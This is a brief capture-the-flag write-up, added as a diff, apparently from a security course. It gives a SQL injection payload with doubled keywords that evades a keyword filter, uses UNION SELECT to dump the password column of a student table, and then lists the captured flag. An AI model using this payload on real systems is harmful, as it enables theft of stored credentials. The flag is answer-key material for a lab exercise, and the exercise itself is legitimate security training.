@@ -1,0 +1,5 @@
+Since I didn't know the uname of the hidden agent i listed all the passwords and the one that looked like a flag was the flag.
+
+Query to list all the passwords: ' oorr '1' = '1' uniunionon selselectect 1,passwoorrd,3,4,5,6,7,8,9,10,11,12,13,14 from student #
+
+FLAG: cs628a{860583c09cd91868fc1092aee7510c26}
